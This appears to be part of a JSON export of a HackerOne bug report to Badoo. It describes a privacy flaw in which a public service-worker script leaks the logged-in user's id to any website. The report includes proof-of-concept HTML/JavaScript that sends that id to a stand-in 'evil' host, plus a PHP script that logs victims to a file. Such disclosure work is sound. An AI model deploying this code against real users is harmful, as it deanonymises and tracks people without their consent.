plaintext\"><code>&lt;?php\n$user = $_GET[&#39;victim&#39;];\n$fd = fopen(&quot;badoo-users-interested-in-my-product.txt&quot;,&quot;a&quot;);\n fwrite($fd, $user);\n fclose($fd);\n?&gt;\n</code></pre>\n<ol>\n<li>The people who may be interested in my new product will start to visit my new product page .</li>\n<li>After a period of time I will be having a txt file <code>badoo-users-interested-in-my-product.txt</code> on my server with a list of ids of all badoo users who have visited my new product page while they are logged into badoo .</li>\n<li>Now I can start a more specific and targeted advertisement campaign by contacting those badoo users directly by private messages or emails .</li>\n</ol>\n\n<h2 id=\"note\">Note :</h2>\n\n<p>This should be clarified the matter , so if you still think this issue isn&#39;t considered a security issue or privacy violation you can close the report as informative .</p>\n\n<p>Best regards , <br>\nThanks ,</p>\n\n<p>Saeed H. </p>\n", 
    "vulnerability_information": "Hey ,\n\nRegarding this report #130453 , I'm pretty sure that there's a little misunderstanding of the issue , so please let me clarify the issue a bit more .\n\nThe issue is not about the disclosure of user's id , that wouldn't be considered an issue at all because every website puts user's id in the user's profile usually , The issue here is the disclosure of badoo user who visited the webpage which contained the exploit code , that allows any site owner or advertisement campaign designer to exploit this issue maliciously by escalating a public and general ads campaign to a targeted ads campaign after collecting the users who were interested in the general campaign .  \n\nLet's clarify a bit further by some details and exploit scenario .\n\n###What made the vulnerability appear ?\n\n1. This script `https://badoo.com/worker-scope/chrome-service-worker.js?ws=1` being contained information dependent on the currently logged in user .\n2. This information can identify the currently logged in user.\n3. The same script being public , and can be called and fetched by any rogue script on any website  .\n\n\n###What makes it an issue ?\n\nIt's considered as a privacy violation . If I visited some website , the website owner is not supposed to figure out my identity , but this issue allow him to do so .\n\nAdditionally the issue allows any one to figure out weather I'm logged in or logged out , and by which account .\n\n###How can any one exploit the issue maliciously ? \n\nLet's consider the following as an exploit scenario .\n\nI'm a commercial website owner who  found out about this issue and decided to take advantage to my new product advertisement campaign .\n\nSo , I designed a plan as following :\n\n1. Start a public and general campaign by setting up the new product page in my website and distributing the link to the page every where , including badoo .\n2. The new product page should contain the Exploit code written below .\n\n```\n<html>\n<script src=https://badoo.com/worker-scope/chrome-service-worker.js?ws=1></script>\n</head>\n<body>\n<script>\nfunction UnmaskUser(str) {\nreturn str.split('=')[0];\n}\nwindow.onload = function(){\nvar user = UnmaskUser(user_id);\nvar xhr = new XMLHttpRequest();\nxhr.open('GET', 'http://MyfancyEvilWebsite.com/identity-stealer.php?victim=' user , true);\nxhr.send();\n};\n</script>\n</html>\n```\nAnd the `identity-stealer.php` should have the code :\n```\n<?php\n$user = $_GET['victim'];\n$fd = fopen(\"badoo-users-interested-in-my-product.txt\",\"a\");\n fwrite($fd, $user);\n fclose($fd);\n?>\n```\n\n3. The people who may be interested in my new product will start to visit my new product page .\n4. After a period of time I will be having a txt file `badoo-users-interested-in-my-product.txt` on my server with a list of ids of all badoo users who have visited my new product page while they are logged into badoo .\n5. Now I can start a more specific and targeted advertisement campaign by contacting those badoo users directly by private messages or emails .\n\n\n##Note : \nThis should be clarified the matter , so if you still think this issue isn't considered a security issue or privacy violation you can close the report as informative .\n\n\nBest regards , \nThanks ,\n\nSaeed H. ", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://badoo.com", 
            "about": "Meet new people", 
            "twitter_handle": "Badoo", 
            "name": "Badoo"
        }, 
        "handle": "badoo", 
        "url": "https://hackerone.com/badoo", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/001/926/59f4050d4a4bd96974a3162224371ddf89b39dd0_small.png?1496674414", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/001/926/41dc40306393e02776cb53d4cc595966a88e6c6e_medium.png?1496674414"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 1926, 
        "default_currency": "usd"
    }, 
    "is_published": false
}